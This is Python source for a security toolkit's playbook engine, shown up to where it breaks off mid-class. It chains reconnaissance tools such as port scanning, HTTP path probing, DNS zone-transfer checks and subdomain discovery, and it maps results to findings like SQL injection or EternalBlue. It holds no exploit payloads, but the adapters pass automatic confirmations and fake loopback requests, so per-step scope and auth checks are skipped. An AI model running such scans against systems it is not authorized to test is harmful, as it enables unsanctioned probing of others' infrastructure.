"""Preset (playbook) engine — load `.mhp` JSON files and run them in-process.

Each step in a preset invokes one tool. We avoid HTTP round-trips by calling
the router's own logic directly. For sync-style tools (whois, tls_audit) we
just `await` the handler. For WebSocket-based tools (port_scanner, http_probe)
we drive them with a fake WebSocket that buffers their `send_json` events
into an asyncio queue — no router refactoring required.

The engine streams a uniform set of events back to its caller:

    {"type": "preset_start",  "preset": "<id>", "target": "<str>", "step_count": N}
    {"type": "step_start",    "step": "<step_id>", "tool": "<tool>", "index": i}
    {"type": "step_progress", "step": "...", "msg": "..."}   # opaque, tool-specific
    {"type": "finding",       "severity": "...", "title": "...", "detail": "...",
                              "step": "...", "evidence": {...}}
    {"type": "step_result",   "step": "...", "summary": {...}}
    {"type": "step_done",     "step": "...", "status": "ok|error|stopped",
                              "elapsed": <sec>, "detail": "<if error>"}
    {"type": "done",          "elapsed": <sec>, "findings_total": N, "stopped": bool}
    {"type": "error",         "detail": "<fatal engine error>"}

Adapters live in `_TOOL_ADAPTERS`. Adding a tool is one new async function
that returns a `dict` (summary). Findings should be yielded via `emit()`.
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import time
import uuid
from pathlib import Path
from typing import Any, Awaitable, Callable

BUILTIN_DIR = Path(__file__).resolve().parent.parent / "presets"
_USER_DIR_NEW = Path.home() / ".hackingpal" / "user_presets"
_USER_DIR_LEGACY = Path.home() / ".myhackingpal" / "user_presets"
# Pre-rebrand fallback: keep reading legacy presets if the new dir doesn't
# exist yet. Safe to remove in a later release.
USER_DIR = _USER_DIR_LEGACY if (_USER_DIR_LEGACY.exists() and not _USER_DIR_NEW.exists()) else _USER_DIR_NEW

EmitFn = Callable[[dict[str, Any]], Awaitable[None]]


class PresetError(Exception):
    """Raised for malformed presets or missing tools."""


# ─────────────────────────────────────────────────────────────────────────────
# Schema
# ─────────────────────────────────────────────────────────────────────────────

REQUIRED_FIELDS = {"id", "name"}     # `steps` OR `phases` required (see _validate)
ALLOWED_TARGET_TYPES = {"domain", "ip", "cidr", "url", "host", "local",
                        "email", "org"}
ALLOWED_CATEGORIES = {
    "passive_recon", "local_posture", "surface_inventory", "web_app",
    "engagement_attack", "custom",
}
ALLOWED_MODES = {"lab", "engagement", "either"}
ALLOWED_RISK_LEVELS = {"passive", "low", "medium", "high", "critical"}


def _validate(d: dict[str, Any]) -> None:
    """Schema check. Accepts two schemas:

    v1 (legacy): top-level `steps` flat array.
    v2 (phases): top-level `phases` array of {id, name, rate_limit, steps}.

    Guided fields (category, mode_required, rationale, success, approval,
    output_keys, condition, feed_to, on_finding) are all optional, so legacy
    `.mhp` files keep loading and v2 files only need to fill what they use.
    """
    missing = REQUIRED_FIELDS - d.keys()
    if missing:
        raise PresetError(f"preset missing required fields: {sorted(missing)}")
    has_phases = isinstance(d.get("phases"), list) and d["phases"]
    has_steps  = isinstance(d.get("steps"),  list) and d["steps"]
    if not has_phases and not has_steps:
        raise PresetError(
            "preset must have a non-empty `phases` (v2) or `steps` (v1) array",
        )
    if d.get("target_type") and d["target_type"] not in ALLOWED_TARGET_TYPES:
        raise PresetError(f"unknown target_type: {d['target_type']!r}")
    if d.get("category") and d["category"] not in ALLOWED_CATEGORIES:
        raise PresetError(f"unknown category: {d['category']!r}")
    if d.get("mode_required") and d["mode_required"] not in ALLOWED_MODES:
        raise PresetError(
            f"unknown mode_required: {d['mode_required']!r} "
            f"(expected one of {sorted(ALLOWED_MODES)})",
        )
    if d.get("risk_level") and d["risk_level"] not in ALLOWED_RISK_LEVELS:
        raise PresetError(f"unknown risk_level: {d['risk_level']!r}")

    if has_phases:
        seen_step_ids: set[str] = set()
        seen_phase_ids: set[Any] = set()
        for pi, ph in enumerate(d["phases"]):
            if not isinstance(ph, dict):
                raise PresetError(f"phase #{pi} is not an object")
            if "id" not in ph:
                raise PresetError(f"phase #{pi} missing `id`")
            if ph["id"] in seen_phase_ids:
                raise PresetError(f"duplicate phase id: {ph['id']!r}")
            seen_phase_ids.add(ph["id"])
            ph_steps = ph.get("steps") or []
            if not isinstance(ph_steps, list) or not ph_steps:
                raise PresetError(
                    f"phase #{pi} ({ph['id']!r}): `steps` must be non-empty"
                )
            for si, s in enumerate(ph_steps):
                _validate_step(s, where=f"phase #{pi} step #{si}",
                               seen_ids=seen_step_ids)
    else:
        seen_step_ids = set()
        for si, s in enumerate(d["steps"]):
            _validate_step(s, where=f"step #{si}", seen_ids=seen_step_ids)


def _enforce_capability(tool: str) -> None:
    """Refuse a gated preset step whose capability group is disabled.

    Preset adapters call tool routers directly, bypassing the route-level
    require_capability gate — so the "off until enabled" guarantee is enforced
    here too. Ungated tools (recon/OSINT/etc.) pass straight through.
    """
    from lib import capability

    group = capability.group_for_preset(tool)
    if group and not capability.is_enabled(group):
        raise PresetError(
            f"capability '{group}' is disabled — enable it in "
            f"Settings → Capabilities to run '{tool}'"
        )


def _validate_step(s: Any, *, where: str, seen_ids: set[str]) -> None:
    if not isinstance(s, dict):
        raise PresetError(f"{where} is not an object")
    if "id" not in s or "tool" not in s:
        raise PresetError(f"{where} missing `id` or `tool`")
    if s["id"] in seen_ids:
        raise PresetError(f"duplicate step id: {s['id']!r}")
    seen_ids.add(s["id"])
    if s["tool"] not in _TOOL_ADAPTERS:
        raise PresetError(
            f"{where} ({s['id']!r}): unknown tool {s['tool']!r}. "
            f"Known tools include: {sorted(_TOOL_ADAPTERS)[:10]} … "
            f"(+{len(_TOOL_ADAPTERS)-10} more)",
        )
    for field in ("rationale", "success", "display_name", "condition"):
        if field in s and s[field] is not None and not isinstance(s[field], str):
            raise PresetError(f"{where} ({s['id']!r}): `{field}` must be a string or null")
    for field in ("output_keys", "feed_to"):
        if field in s and not isinstance(s[field], list):
            raise PresetError(f"{where} ({s['id']!r}): `{field}` must be a list")
    if "approval" in s and not isinstance(s["approval"], bool):
        raise PresetError(f"{where} ({s['id']!r}): `approval` must be a boolean")
    if "on_finding" in s and s["on_finding"] not in (None, "continue", "pause", "stop"):
        raise PresetError(
            f"{where} ({s['id']!r}): `on_finding` must be one of "
            f"continue|pause|stop|null"
        )


# ─────────────────────────────────────────────────────────────────────────────
# Library
# ─────────────────────────────────────────────────────────────────────────────

def _load_dir(dir_path: Path, author: str) -> dict[str, dict[str, Any]]:
    out: dict[str, dict[str, Any]] = {}
    if not dir_path.exists():
        return out
    for f in sorted(dir_path.glob("*.mhp")):
        try:
            d = json.loads(f.read_text())
        except Exception as e:
            print(f"[presets] skipping {f.name}: {e}")
            continue
        d.setdefault("author", author)
        d["_builtin"] = (author == "built-in")
        d["_path"] = str(f)
        try:
            _validate(d)
        except PresetError as e:
            print(f"[presets] skipping {f.name}: {e}")
            continue
        out[d["id"]] = d
    return out


def list_presets() -> list[dict[str, Any]]:
    """Return all presets (built-in + user) as summary dicts."""
    presets = {**_load_dir(BUILTIN_DIR, "built-in"),
               **_load_dir(USER_DIR, "user")}
    summaries: list[dict[str, Any]] = []
    for p in presets.values():
        phases = p.get("phases") or []
        step_count = (sum(len(ph.get("steps") or []) for ph in phases)
                      if phases else len(p.get("steps") or []))
        summaries.append({
            "id": p["id"], "name": p["name"],
            "description": p.get("description", ""),
            "target_type": p.get("target_type", "domain"),
            "category": p.get("category", "custom"),
            "mode_required": p.get("mode_required", "either"),
            "risk_level": p.get("risk_level", "low"),
            "estimated_duration": p.get("estimated_duration", ""),
            "requires_auth": bool(p.get("requires_auth", False)),
            "stop_on_critical": bool(p.get("stop_on_critical", False)),
            "report_template": p.get("report_template", ""),
            "author": p.get("author", ""),
            "phase_count": len(phases),
            "step_count": step_count,
            "schema": "v2" if phases else "v1",
            "builtin": p["_builtin"],
        })
    summaries.sort(key=lambda s: (not s["builtin"], s["category"], s["name"]))
    return summaries


def get_preset(pid: str) -> dict[str, Any] | None:
    p = _load_dir(BUILTIN_DIR, "built-in").get(pid) or \
        _load_dir(USER_DIR, "user").get(pid)
    return p


def save_preset(definition: dict[str, Any]) -> dict[str, Any]:
    """Persist a user preset (not built-in). Allocates an id if missing."""
    USER_DIR.mkdir(parents=True, exist_ok=True)
    if "id" not in definition or not str(definition["id"]).strip():
        definition["id"] = f"custom_{uuid.uuid4().hex[:8]}"
    definition.setdefault("author", "user")
    _validate(definition)
    if (BUILTIN_DIR / f"{definition['id']}.mhp").exists():
        raise PresetError(
            f"cannot overwrite built-in preset {definition['id']!r}",
        )
    path = USER_DIR / f"{definition['id']}.mhp"
    path.write_text(json.dumps(definition, indent=2))
    return {"id": definition["id"], "path": str(path)}


def delete_preset(pid: str) -> bool:
    path = USER_DIR / f"{pid}.mhp"
    if not path.exists():
        return False
    path.unlink()
    return True


# ─────────────────────────────────────────────────────────────────────────────
# WebSocket adapter — drive a WS-based router handler in-process
# ─────────────────────────────────────────────────────────────────────────────

class _LocalWS:
    """Minimal stand-in for a FastAPI WebSocket. The router handler calls
    accept/receive_json/send_json/close on us; we buffer outbound messages
    so the caller can iterate them as events.

    On `receive_json`, the first call returns the handshake init we were
    constructed with. Subsequent calls block until the stop_event fires,
    then return a `{"action": "stop"}` so the handler's stop-listener
    co-routine exits cleanly.
    """

    def __init__(self, init: dict[str, Any], stop_event: asyncio.Event) -> None:
        self._init = init
        self._init_sent = False
        self._stop = stop_event
        self._out: asyncio.Queue[dict[str, Any] | None] = asyncio.Queue()
        self.closed = False
        # Routers now read mode + engagement id via get_mode(ws)/get_engagement_id(ws)
        # which expect an HTTPConnection-like surface. The engine runs adapters
        # in-process; we use loopback defaults so scope checks behave like a
        # local request without a mode header (= Lab) and let the handshake
        # dict carry mode/engagement_id when needed.
        self.headers: dict[str, str] = {}
        self.query_params: dict[str, str] = {}
        # FastAPI WebSocket exposes `.client` as a (host, port) namedtuple;
        # the auth dependency checks `client.host in _LOOPBACK_HOSTS`.
        class _C:
            host = "127.0.0.1"
            port = 0
        self.client = _C()

    async def accept(self) -> None:  # noqa: D401
        return None

    async def receive_json(self) -> dict[str, Any]:
        if not self._init_sent:
            self._init_sent = True
            return self._init
        # Hold until stop or until the handler is cancelled by the caller.
        await self._stop.wait()
        return {"action": "stop"}

    async def send_json(self, msg: dict[str, Any]) -> None:
        await self._out.put(msg)

    async def close(self, code: int = 1000) -> None:
        self.closed = True
        await self._out.put(None)  # sentinel

    async def events(self):
        while True:
            ev = await self._out.get()
            if ev is None:
                return
            yield ev


async def _drive_ws(handler_coro_factory, init: dict[str, Any],
                    emit: EmitFn, stop_event: asyncio.Event,
                    *, on_event=None) -> dict[str, Any]:
    """Run a WS-based router handler in-process. Returns whatever the
    `on_event` callback accumulates into a `summary` dict (or `{}`).

    `handler_coro_factory(ws)` returns the awaitable for the router handler.
    `on_event(ev, summary)` is called for each outbound event; it may mutate
    `summary` and/or call `emit(...)` to forward selected events to the
    preset's caller.
    """
    ws = _LocalWS(init, stop_event)
    summary: dict[str, Any] = {}
    handler_task = asyncio.create_task(handler_coro_factory(ws))
    try:
        async for ev in ws.events():
            if on_event:
                await on_event(ev, summary)
        # Drain the handler (it may already be done)
        try:
            await handler_task
        except Exception:
            pass
    finally:
        if not handler_task.done():
            handler_task.cancel()
            try:
                await handler_task
            except (asyncio.CancelledError, Exception):
                pass
    return summary


# ─────────────────────────────────────────────────────────────────────────────
# Adapters — each takes (target, options, context, emit, stop_event) → summary
# ─────────────────────────────────────────────────────────────────────────────

# Local request shim — REST router handlers call get_mode/get_engagement_id on
# their FastAPI Request. The engine drives them in-process, so we hand them a
# minimal stand-in that looks like a loopback request with no mode/eid hints.
# The playbook runner has already done the top-level scope+mode check before
# any adapter runs, so per-call routers fall back to Lab-mode defaults and
# their `scope.enforce_rest` calls go through without a second prompt.
class _LocalReq:
    class _C:
        host = "127.0.0.1"
        port = 0
    client = _C()
    headers: dict[str, str] = {}
    query_params: dict[str, str] = {}


def _target_to_host(target: str) -> str:
    """Strip URL scheme + path + port from `target`, returning a bare host/IP.
    Lab playbook targets arrive as `http://127.0.0.1:8081`; passive-recon
    handlers (whois, dns_recon, ct_log, email_audit) want just the host."""
    from urllib.parse import urlparse
    t = (target or "").strip()
    if "://" in t:
        try:
            host = urlparse(t).hostname or t
        except ValueError:
            host = t
    else:
        host = t
    # Strip optional :port on bare host:port (skip IPv6 multi-colon form).
    if host.count(":") == 1 and not host.startswith("["):
        host = host.split(":", 1)[0]
    return host.strip().strip(".").lower()


def _looks_like_ip(host: str) -> bool:
    import ipaddress
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return False


async def _adapter_whois(target: str, options: dict[str, Any],
                         context: dict[str, Any], emit: EmitFn,
                         stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import whois as r
    host = _target_to_host(target)
    try:
        result = await r.whois_lookup(host, _LocalReq())
    except Exception as e:
        raise PresetError(f"whois: {e}") from e
    # Surface findings that the router already produced
    for f in result.get("findings", []) or []:
        await emit({
            "type": "finding", "step": "whois",
            "severity": f.get("severity", "info"),
            "title": f.get("label") or f.get("title", "whois finding"),
            "detail": f.get("detail", ""),
        })
    return {
        "asn": result.get("asn", {}),
        "domain": result.get("domain", {}),
        "network": result.get("network", {}),
        "resolved_ip": result.get("resolved_ip"),
        "policy": result.get("policy", {}),
    }


async def _adapter_tls_audit(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import tls_audit as r
    # If the target carries an explicit `:port` after the host, prefer that
    # over the option default. Strip it before validation so the hostname
    # validator doesn't reject the colon.
    raw = (target or "").strip()
    from urllib.parse import urlparse
    if "://" in raw:
        u = urlparse(raw)
        host = u.hostname or raw
        port = int(u.port) if u.port else int(options.get("port", 443))
    else:
        host = raw
        port = int(options.get("port", 443))
        if host.count(":") == 1 and not host.startswith("["):
            host, _, port_s = host.rpartition(":")
            try:
                port = int(port_s)
            except ValueError:
                pass
    try:
        result = await r.tls_audit(host, _LocalReq(), port=port)
    except Exception as e:
        raise PresetError(f"tls_audit: {e}") from e
    for f in result.get("findings", []) or []:
        await emit({
            "type": "finding", "step": "tls_audit",
            "severity": f.get("severity", "info"),
            "title": f.get("label") or f.get("title", "TLS finding"),
            "detail": f.get("detail", ""),
        })
    return {
        "host": result.get("host"), "port": result.get("port"),
        "ip": result.get("ip"),
        "expiry_days": (result.get("cert") or {}).get("days_until_expiry"),
        "negotiated": result.get("negotiated_cipher"),
        "policy": result.get("policy", {}),
    }


async def _adapter_port_scanner(target: str, options: dict[str, Any],
                                context: dict[str, Any], emit: EmitFn,
                                stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import port_scanner as r
    # The port scanner accepts host or IP — strip URL scheme/port if present.
    init = {
        "target": _target_to_host(target) or target,
        "ports":   options.get("ports", "1-1024"),
        "timeout": float(options.get("timeout", 0.5)),
        "threads": int(options.get("threads", 200)),
    }
    open_ports: list[dict[str, Any]] = []

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        t = ev.get("type")
        if t == "open":
            entry = {"port": ev["port"],
                     "service": ev.get("service", ""),
                     "banner": ev.get("banner", "")[:200]}
            open_ports.append(entry)
            await emit({
                "type": "finding", "step": "port_scanner",
                "severity": "medium" if ev["port"] in (21, 23, 25, 110, 143,
                                                       3389, 5900) else "info",
                "title": f"Open port {ev['port']}/tcp",
                "detail": f"{ev.get('service','')} — {entry['banner']}",
            })
        elif t == "progress":
            await emit({"type": "step_progress", "step": "port_scanner",
                        "msg": f"{ev['done']}/{ev['total']} probed"})
        elif t == "error":
            raise PresetError(f"port_scanner: {ev.get('detail','')}")

    await _drive_ws(r.port_scan_ws, init, emit, stop_event, on_event=on_event)
    return {"open_count": len(open_ports), "open_ports": open_ports}


async def _adapter_http_probe(target: str, options: dict[str, Any],
                              context: dict[str, Any], emit: EmitFn,
                              stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import http_probe as r
    # Build a usable URL — if target doesn't include a scheme, assume http(s).
    # Prefer https; the probe handles redirects on its own.
    url = target.strip()
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    init = {
        "url": url,
        "wordlist": options.get("wordlist", "small"),
        "max_concurrency": int(options.get("max_concurrency", 16)),
        "confirm": True,    # presets imply user already authorized via UI checkbox
    }
    hit_count = 0

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        nonlocal hit_count
        t = ev.get("type")
        if t == "finding":
            await emit({
                "type": "finding", "step": "http_probe",
                "severity": ev.get("severity", "info"),
                "title": ev.get("label", "HTTP finding"),
                "detail": ev.get("detail", ""),
            })
        elif t == "hit":
            hit_count += 1
            await emit({
                "type": "finding", "step": "http_probe",
                "severity": "low",
                "title": f"Discovered path: {ev.get('path','')}",
                "detail": f"HTTP {ev.get('status','?')} · "
                          f"len={ev.get('length','?')}",
            })
        elif t == "progress":
            await emit({"type": "step_progress", "step": "http_probe",
                        "msg": f"{ev['done']}/{ev['total']} paths"})
        elif t == "error":
            raise PresetError(f"http_probe: {ev.get('detail','')}")

    await _drive_ws(r.http_probe_ws, init, emit, stop_event, on_event=on_event)
    return {"hits": hit_count, "url": url}


async def _adapter_dns_recon(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import dns_recon as r
    host = _target_to_host(target)
    # The DNS recon endpoint validates a domain (requires a dot, rejects IPs).
    # Lab targets are IP literals — skip cleanly instead of erroring.
    if not host or _looks_like_ip(host) or "." not in host:
        await emit({
            "type": "step_progress", "step": "dns_recon",
            "msg": f"skipped: {host or target!r} is not a DNS-resolvable domain",
        })
        return {
            "domain": host, "a": [], "ns": [], "mx": [],
            "axfr_succeeded": False, "dnssec_signed": False, "skipped": True,
        }
    try:
        result = await r.dns_recon(host, confirm=True)
    except Exception as e:
        raise PresetError(f"dns_recon: {e}") from e
    for f in result.get("findings", []) or []:
        await emit({
            "type": "finding", "step": "dns_recon",
            "severity": f.get("severity", "info"),
            "title":    f.get("label", "DNS finding"),
            "detail":   f.get("detail", ""),
        })
    records = result.get("records", {}) or {}
    return {
        "domain": result.get("domain"),
        "a":  records.get("A",  []),
        "ns": records.get("NS", []),
        "mx": records.get("MX", []),
        "axfr_succeeded": any(
            z.get("succeeded") for z in result.get("zone_transfer", []) or []
        ),
        "dnssec_signed": (result.get("dnssec") or {}).get("signed", False),
    }


async def _adapter_ct_log(target: str, options: dict[str, Any],
                          context: dict[str, Any], emit: EmitFn,
                          stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import ct_log as r
    host = _target_to_host(target)
    # crt.sh keys on a domain — IP literals make no sense here.
    if not host or _looks_like_ip(host) or "." not in host:
        await emit({
            "type": "step_progress", "step": "ct_log",
            "msg": f"skipped: {host or target!r} is not a domain (no CT records)",
        })
        return {"domain": host, "subdomain_count": 0, "subdomains": [],
                "recent_7d": 0, "skipped": True}
    try:
        result = await r.ct_search(host, _LocalReq(), confirm=True)
    except Exception as e:
        raise PresetError(f"ct_log: {e}") from e
    for f in result.get("findings", []) or []:
        await emit({
            "type": "finding", "step": "ct_log",
            "severity": f.get("severity", "info"),
            "title":    f.get("label", "CT finding"),
            "detail":   f.get("detail", ""),
        })
    return {
        "domain": result.get("domain"),
        "subdomain_count": len(result.get("subdomains", []) or []),
        "subdomains": (result.get("subdomains") or [])[:50],
        "recent_7d": result.get("recent_7d_count", 0),
    }


async def _adapter_email_audit(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import email_security as r
    host = _target_to_host(target)
    # SPF/DKIM/DMARC live in DNS — skip IP-only / TLD-less targets cleanly.
    if not host or _looks_like_ip(host) or "." not in host:
        await emit({
            "type": "step_progress", "step": "email_audit",
            "msg": f"skipped: {host or target!r} is not a domain",
        })
        return {"domain": host, "spf_present": False, "dmarc_present": False,
                "mta_sts": False, "bimi": False, "skipped": True}
    try:
        result = await r.email_audit(host, _LocalReq(), confirm=True)
    except Exception as e:
        raise PresetError(f"email_audit: {e}") from e
    for f in result.get("findings", []) or []:
        await emit({
            "type": "finding", "step": "email_audit",
            "severity": f.get("severity", "info"),
            "title":    f.get("label", "Email security finding"),
            "detail":   f.get("detail", ""),
        })
    spf = result.get("spf",   {}) or {}
    dmarc = result.get("dmarc", {}) or {}
    return {
        "domain": result.get("domain"),
        "spf_present":   spf.get("present", False),
        "dmarc_present": dmarc.get("present", False),
        "mta_sts":       (result.get("mta_sts") or {}).get("present", False),
        "bimi":          (result.get("bimi")    or {}).get("present", False),
    }


async def _adapter_cms_fingerprint(target: str, options: dict[str, Any],
                                   context: dict[str, Any], emit: EmitFn,
                                   stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import cms as r
    url = target.strip()
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    try:
        result = await r.cms_fingerprint(_LocalReq(), url=url, confirm=True)
    except Exception as e:
        raise PresetError(f"cms_fingerprint: {e}") from e
    for f in result.get("findings", []) or []:
        await emit({
            "type": "finding", "step": "cms_fingerprint",
            "severity": f.get("severity", "info"),
            "title":    f.get("label", "CMS finding"),
            "detail":   f.get("detail", ""),
        })
    techs = result.get("technologies", []) or []
    return {
        "url": result.get("final_url") or result.get("url"),
        "tech_count": len(techs),
        "tech_names": [t.get("name") for t in techs if t.get("name")][:20],
        "host": result.get("host"),
        "status_code": result.get("status_code"),
    }


class _LabModeConn:
    """Minimal request/HTTPConnection stand-in for invoking a tool's route
    handler directly from the preset engine.

    The macOS/Linux posture handlers take a FastAPI ``Request`` but read it
    only via ``lib.mode.get_engagement_id`` / ``get_mode`` — which touch just
    ``.headers`` / ``.query_params`` — to gate on engagement presence. Empty
    here ⇒ lab mode ⇒ ``scope.enforce_engagement_present`` no-ops, which is
    correct: the run-level mode/engagement gate has already passed before any
    step runs, so this per-step re-check is redundant. Posture collection
    itself never touches the request.
    """

    headers: dict[str, str] = {}
    query_params: dict[str, str] = {}


_LAB_CONN = _LabModeConn()


async def _adapter_macos_posture(target: str, options: dict[str, Any],
                                 context: dict[str, Any], emit: EmitFn,
                                 stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import macos_posture as r
    try:
        result = await r.macos_posture(_LAB_CONN)
    except Exception as e:
        raise PresetError(f"macos_posture: {e}") from e
    for f in result.get("findings", []) or []:
        await emit({
            "type": "finding", "step": "macos_posture",
            "severity": f.get("severity", "info"),
            "title":    f.get("label", "macOS posture finding"),
            "detail":   f.get("detail", ""),
        })
    return {
        "sip":        (result.get("sip")        or {}).get("status"),
        "gatekeeper": (result.get("gatekeeper") or {}).get("status"),
        "filevault":  (result.get("filevault")  or {}).get("status"),
        "firewall_on": bool((result.get("firewall") or {}).get("global_state", 0)),
    }


async def _adapter_linux_posture(target: str, options: dict[str, Any],
                                 context: dict[str, Any], emit: EmitFn,
                                 stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import linux_posture as r
    try:
        result = r.linux_posture(_LAB_CONN)
    except Exception as e:
        raise PresetError(f"linux_posture: {e}") from e
    for f in result.get("findings", []) or []:
        await emit({
            "type": "finding", "step": "linux_posture",
            "severity": f.get("severity", "info"),
            "title":    f.get("label", "Linux posture finding"),
            "detail":   f.get("detail", ""),
        })
    mac = result.get("mac", {}) or {}
    fw  = result.get("firewall", {}) or {}
    return {
        "selinux":  mac.get("selinux"),
        "apparmor": mac.get("apparmor"),
        "firewall_backend": fw.get("backend"),
        "firewall_active":  fw.get("active"),
        "updates_pending": (result.get("updates") or {}).get("pending", 0),
        "luks_present":    (result.get("disk") or {}).get("any_encrypted", False),
    }


async def _adapter_persistence_audit(target: str, options: dict[str, Any],
                                     context: dict[str, Any], emit: EmitFn,
                                     stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import persistence as r
    try:
        result = r.audit()
    except Exception as e:
        raise PresetError(f"persistence_audit: {e}") from e
    entries = result.get("entries", []) or []
    sev_counts = {"high": 0, "warn": 0, "info": 0}
    for entry in entries:
        # Entries may be Pydantic models or dicts depending on router.
        sev   = getattr(entry, "severity",      None) or (entry.get("severity") if isinstance(entry, dict) else "info")
        label = getattr(entry, "label",         None) or (entry.get("label", "")    if isinstance(entry, dict) else "")
        prog  = getattr(entry, "program",       None) or (entry.get("program", "")  if isinstance(entry, dict) else "")
        susp  = getattr(entry, "suspicious_path", False)
        if isinstance(entry, dict):
            susp = entry.get("suspicious_path", False)
        sev_counts[sev] = sev_counts.get(sev, 0) + 1
        if sev in ("high", "warn") or susp:
            await emit({
                "type": "finding", "step": "persistence_audit",
                "severity": "high" if sev == "high" else "medium",
                "title": f"Persistence: {label or '(unnamed)'}",
                "detail": f"{prog or '(no program)'}"
                          + (" — suspicious path" if susp else ""),
            })
    return {
        "total":  len(entries),
        "high":   sev_counts.get("high", 0),
        "warn":   sev_counts.get("warn", 0),
        "info":   sev_counts.get("info", 0),
    }


_TOOL_ADAPTERS: dict[str, Callable[..., Awaitable[dict[str, Any]]]] = {
    "whois":             _adapter_whois,
    "tls_audit":         _adapter_tls_audit,
    "port_scanner":      _adapter_port_scanner,
    "http_probe":        _adapter_http_probe,
    "dns_recon":         _adapter_dns_recon,
    "ct_log":            _adapter_ct_log,
    "email_audit":       _adapter_email_audit,
    "cms_fingerprint":   _adapter_cms_fingerprint,
    "macos_posture":     _adapter_macos_posture,
    "linux_posture":     _adapter_linux_posture,
    "persistence_audit": _adapter_persistence_audit,
}


# ─────────────────────────────────────────────────────────────────────────────
# v2 phase-based runner — feed-forward, conditions, rate limit, auto-promote
# ─────────────────────────────────────────────────────────────────────────────
#
# v1 (legacy) presets are a flat `steps` array, executed sequentially.
# v2 presets group steps into `phases`. Each phase:
#   * runs sequentially within itself
#   * has a `rate_limit` (req/s)
#   * passes a phase-scoped output dict forward to later phases
#
# Steps declare `output_keys` to publish into the feed-forward context.
# Later steps reference those values via `{phase_N.step_id.key}` templates
# in `options`/`targets`.
#
# Steps support `condition` (simple expression); if false, step is skipped.
#
# Step results matching `_FINDING_RULES` auto-promote into finding events.
# Preset-level `stop_on_critical: true` pauses the run on a critical finding
# until the client sends {"action":"continue"} or {"action":"stop"}.

# ── Finding auto-promotion rules ───────────────────────────────────────────

# Each rule: (predicate, severity, title_template). Predicate runs over the
# step-result summary dict. title_template is a format string interpolated
# with summary values.
_FINDING_RULES: list[tuple[Callable[[dict[str, Any]], bool], str, str]] = [
    (lambda s: bool(s.get("subdomain_takeover") or s.get("takeover_found")
                    or (isinstance(s.get("vulnerable_subdomains"), list)
                        and len(s["vulnerable_subdomains"]) > 0)),
     "critical", "Subdomain takeover candidate"),
    (lambda s: bool(s.get("default_creds")
                    or (isinstance(s.get("default_creds_found"), list)
                        and len(s["default_creds_found"]) > 0)),
     "critical", "Default credentials accepted"),
    (lambda s: bool(s.get("sqli_detected") or s.get("sqli_found")
                    or (isinstance(s.get("injectable_params"), list)
                        and len(s["injectable_params"]) > 0)),
     "critical", "SQL injection detected"),
    (lambda s: bool(s.get("xss_detected") or s.get("reflected_xss")
                    or s.get("stored_xss") or s.get("dom_xss")),
     "high", "Cross-site scripting detected"),
    (lambda s: bool(s.get("imds_exposed") or s.get("imds_accessible")
                    or s.get("credentials_exposed")),
     "critical", "Cloud metadata service exposed"),
    (lambda s: bool(s.get("public_s3_bucket")
                    or (isinstance(s.get("public_buckets"), list)
                        and len(s["public_buckets"]) > 0)),
     "high", "Public S3 bucket"),
    (lambda s: bool(s.get("breach_found")
                    or int(s.get("breached_accounts") or 0) > 0
                    or int(s.get("breach_count") or 0) > 0),
     "high", "Domain found in breach corpus"),
    (lambda s: bool(s.get("tls_expired") or s.get("expired")),
     "medium", "TLS certificate expired"),
    (lambda s: bool(s.get("cmdi_found") or s.get("cmdi_detected")),
     "critical", "Command injection detected"),
    (lambda s: bool(s.get("lfi_found")
                    or (isinstance(s.get("files_read"), list)
                        and len(s["files_read"]) > 0)),
     "high", "Local file inclusion"),
    (lambda s: bool(s.get("ssrf_found") or s.get("internal_access")),
     "high", "Server-side request forgery"),
    (lambda s: bool(s.get("axfr_succeeded") or s.get("zone_transfer_success")),
     "high", "DNS zone transfer succeeded"),
    (lambda s: int(s.get("ms17_010") or 0) > 0 or s.get("eternalblue"),
     "critical", "MS17-010 (EternalBlue) candidate"),
    (lambda s: bool(s.get("null_session") or s.get("null_session_allowed")),
     "medium", "SMB null session allowed"),
    (lambda s: bool(s.get("admin_panel_exposed")
                    or (isinstance(s.get("admin_panels"), list)
                        and len(s["admin_panels"]) > 0)),
     "medium", "Admin panel exposed"),
]


async def _maybe_promote_findings(
    summary: dict[str, Any], step_id: str, tool: str, emit: EmitFn,
) -> list[dict[str, Any]]:
    """Run the auto-promote rules over `summary`. Returns the list of
    promoted findings (also emitted as `finding` events).
    """
    promoted: list[dict[str, Any]] = []
    for predicate, severity, title in _FINDING_RULES:
        try:
            if predicate(summary):
                finding = {
                    "type": "finding", "step": step_id, "tool": tool,
                    "severity": severity, "title": title,
                    "detail": _short_evidence(summary),
                    "auto_promoted": True,
                }
                await emit(finding)
                promoted.append(finding)
        except Exception:
            # A bad rule shouldn't kill the run.
            pass
    return promoted


def _short_evidence(summary: dict[str, Any], limit: int = 240) -> str:
    """One-line evidence string for an auto-promoted finding."""
    try:
        as_json = json.dumps(summary, default=str)
    except Exception:
        as_json = str(summary)
    return as_json[:limit]


# ── Phase context + template expansion ────────────────────────────────────

class _PhaseContext:
    """Phase-scoped output store: {phase_N: {step_id: {output_key: value}}}.

    Steps publish to it via `record(phase_idx, step_id, summary, output_keys)`.
    Later steps reference values via `{phase_N.step_id.key}` templates that
    `expand_value` resolves against this store.
    """

    _REF_RE = re.compile(r"\{phase_(\d+)\.([a-zA-Z0-9_]+)\.([a-zA-Z0-9_]+)\}")

    def __init__(self) -> None:
        # outer key is "phase_<N>" string for readable serialization
